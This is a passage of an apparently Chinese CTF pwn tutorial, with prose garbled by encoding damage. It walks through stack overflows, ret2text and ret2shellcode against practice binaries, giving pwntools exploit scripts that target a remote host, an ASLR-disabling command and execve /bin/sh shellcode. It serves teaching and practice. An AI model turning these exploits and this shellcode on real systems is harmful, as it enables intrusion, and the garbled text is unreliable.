&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">vulnerable&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="n">stack1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nl">c&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">In&lt;/span> &lt;span class="n">function&lt;/span> &lt;span class="err">â€˜&lt;/span>&lt;span class="n">vulnerable&lt;/span>&lt;span class="err">â€™&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stack1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nl">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nl">warning&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">implicit&lt;/span> &lt;span class="n">declaration&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">function&lt;/span> &lt;span class="err">â€˜&lt;/span>&lt;span class="n">gets&lt;/span>&lt;span class="err">â€™&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">did&lt;/span> &lt;span class="n">you&lt;/span> &lt;span class="n">mean&lt;/span> &lt;span class="err">â€˜&lt;/span>&lt;span class="n">fgets&lt;/span>&lt;span class="err">â€™&lt;/span>&lt;span class="o">?&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Wimplicit&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">declaration&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">gets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">^~~~&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fgets&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">ccNeCYTO&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nl">o&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">In&lt;/span> &lt;span class="n">function&lt;/span> &lt;span class="err">`&lt;/span>&lt;span class="n">vulnerable&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stack1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nl">c&lt;/span>&lt;span class="p">:(.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mh">0x45&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nl">warning&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="err">`&lt;/span>&lt;span class="n">gets&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="n">function&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="n">dangerous&lt;/span> &lt;span class="n">and&lt;/span> &lt;span class="n">should&lt;/span> &lt;span class="n">not&lt;/span> &lt;span class="n">be&lt;/span> &lt;span class="n">used&lt;/span>&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/code>&lt;/p>
&lt;p>å…³é—­å®Œå…¨éƒ¨ä¿æŠ¤&lt;/p>
&lt;p>æ­¥éª¤ï¼šæŸ¥çœ‹gets()å†™å…¥çš„åœ°å€è·ç¦»ebpçš„é•¿åº¦ï¼ˆè®¡ç®—å¡«å……é•¿åº¦ï¼‰-&amp;gt;+ebpçš„é•¿åº¦-&amp;gt;+è¿”å›çš„åœ°å€ï¼ˆsuccess()çš„åœ°å€)&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406211946.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406212108.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>poc1.py&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># sh = process(&amp;#34;./stack1&amp;#34;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10000&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">success_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x08048456&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mh">0x14&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;bbbb&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">success_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406212343.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;hr>
&lt;h3 id="åŸºæœ¬rop">åŸºæœ¬ROP&lt;/h3>
&lt;p>ROP æ”»å‡»ä¸€èˆ¬å¾—æ»¡è¶³å¦‚ä¸‹æ¡ä»¶&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="ret2text">ret2text&lt;/h3>
&lt;p>ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)ã€‚&lt;/p>
&lt;p>ç¤ºä¾‹ç¨‹åºï¼š&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank" rel="noopener"
>ret2text&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406214601.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190412180957.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406220340.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æ‰€ä»¥åªéœ€retåˆ°&lt;code>0x0804863a&lt;/code>å°±èƒ½getshell&lt;/p>
&lt;p>æ„é€ payload&lt;/p>
&lt;ul>
&lt;li>
&lt;p>è®¡ç®—åç§»é‡&lt;/p>
&lt;ul>
&lt;li>ä½¿ç”¨ragg2&lt;/li>
&lt;/ul>
&lt;p>&lt;code>ragg2 -P 200 -r &amp;gt; pattern.txt&lt;/code> or &lt;code>ragg2 -P 200 -r&lt;/code>å¤åˆ¶ä¸‹æ¥&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ragg2 -P 200 -r&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA#
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>profile.rr2:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#!/usr/bin/rarun2
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="nv">stdin&lt;/span>&lt;span class="o">=&lt;/span>./pattern.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>r2 -R profile.rr2 -d ret2text&lt;/code> or ç›´æ¥&lt;code>r2 -d ret2text&lt;/code>&lt;/p>
&lt;p>&lt;code>dc&lt;/code>åè¾“å…¥å¤åˆ¶çš„patternå­—ç¬¦ä¸²&lt;/p>
&lt;p>&lt;code>wopO eip&lt;/code>å¾—åˆ°åç§»&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406231721.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>gdbæ‰‹åŠ¨è®¡ç®—&lt;/p>
&lt;p>ä¸‹æ–­ç‚¹callå¤„ï¼š&lt;code>0x080486ae&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406233003.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190406233035.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190412181030.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æ‰€ä»¥åç§»ä¸º108+4&lt;/p>
&lt;/li>
&lt;li>
&lt;p>python pattern.py&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># sh = process(./ret2text)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10001&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">binsh&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0804863a&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">112&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">binsh&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190412181108.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="ret2shellcode">ret2shellcode&lt;/h3>
&lt;p>&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="noopener"
>ret2shellcode&lt;/a>&lt;/p>
&lt;ul>
&lt;li>è¿è¡Œæ—¶shellcodeæ‰€åœ¨åŒºåŸŸåº”å…·æœ‰å¯æ‰§è¡Œæƒé™&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407123948.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407132349.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>strncpyå‡½æ•°å°†getsçš„å†…å®¹å¤åˆ¶åˆ°buf2 bufå­˜æ”¾åˆ°.bssæ®µçš„[0x804a080:4]ä½ç½®ã€‚&lt;/p>
&lt;p>è°ƒè¯•çœ‹æ‰€åœ¨.bssæ®µæ˜¯å¦æœ‰æ‰§è¡Œçš„æƒé™ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407132843.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407133456.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>payload:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#coding:utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># context(log_level = &amp;#39;debug&amp;#39;,arch =&amp;#39;i386&amp;#39;,os = &amp;#39;linux&amp;#39; )&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># sh = process(./ret2shellcode)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10002&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## è·å¾—system(&amp;#34;bin/sh&amp;#34;)çš„asm&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">shellcode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">asm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shellcraft&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sh&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf2_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x804a080&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># sh.sendline(shellcode+&amp;#34;\x90&amp;#34;*(112-len(shellcode))+p32(buf2_addr))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shellcode&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ljust&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf2_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407134402.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>ç»ƒä¹ é¢˜ï¼šsniperoj-pwn100-shellcode-x86-64&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407140954.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407144021.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>åç§»ï¼š&lt;code>var void *buf @ rbp-0x10&lt;/code> shellcodeå¯ç”¨ç©ºé—´ï¼š16+8=24&lt;/p>
&lt;p>æ‰¾shellcode &lt;a class="link" href="https://www.exploit-db.com/" target="_blank" rel="noopener"
>https://www.exploit-db.com/&lt;/a>&lt;/p>
&lt;p>&lt;a class="link" href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener"
>http://shell-storm.org/shellcode/&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # char *const argv[]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xorl %esi, %esi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # &amp;#39;h&amp;#39; &amp;#39;s&amp;#39; &amp;#39;/&amp;#39; &amp;#39;/&amp;#39; &amp;#39;n&amp;#39; &amp;#39;i&amp;#39; &amp;#39;b&amp;#39; &amp;#39;/&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0x68732f2f6e69622f, %rbx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # for &amp;#39;\x00&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushq %rsi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushq %rbx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushq %rsp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # const char *filename
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popq %rdi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # __NR_execve 59
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushq $59
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> popq %rax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # char *const envp[]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xorl %edx, %edx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> syscall
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/*
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> gcc -z execstack push64.c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> uname -r
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 3.19.3-3-ARCH
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> shellcode = &amp;#34;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&amp;#34;;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
